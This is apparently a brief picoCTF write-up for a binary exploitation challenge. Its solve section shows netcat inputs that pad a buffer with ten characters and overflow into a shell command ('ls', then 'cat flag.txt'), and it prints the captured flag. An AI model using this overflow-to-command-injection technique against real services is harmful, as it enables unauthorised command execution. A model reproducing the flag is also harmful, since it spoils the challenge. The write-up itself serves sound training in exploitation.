A friendly program wants to greet you… but its goodbye might say more than it should. Can you convince it to reveal the flag?

Additional details will be available after launching your challenge instance.

Hint>
Look closely at how the program stores and uses your input.


connect to the challenge instance `nc saffron-estate.picoctf.net 50678`. You can Download the program file [here](https://challenge-files.picoctf.net/c_saffron_estate/0532961cc14f7afe5cc9f06eb6467de47963573c403f7e150c1b542215d3dbb5/vuln). And source [code](https://challenge-files.picoctf.net/c_saffron_estate/0532961cc14f7afe5cc9f06eb6467de47963573c403f7e150c1b542215d3dbb5/vuln.c)


## Solve

```
❯ nc saffron-estate.picoctf.net 50678 <<< "AAAAAAAAAAls"
What is your name?
Goodbye, AAAAAAAAAAls!
flag.txt
 ~/Downloads/tmp/picoMini2025/binexp/injection1 
❯ nc saffron-estate.picoctf.net 50678 <<< "AAAAAAAAAAcat flag.txt"
What is your name?
Goodbye, AAAAAAAAAAcat flag.txt!
picoCTF{0v3rfl0w_c0mm4nd_0e1de30d}%
```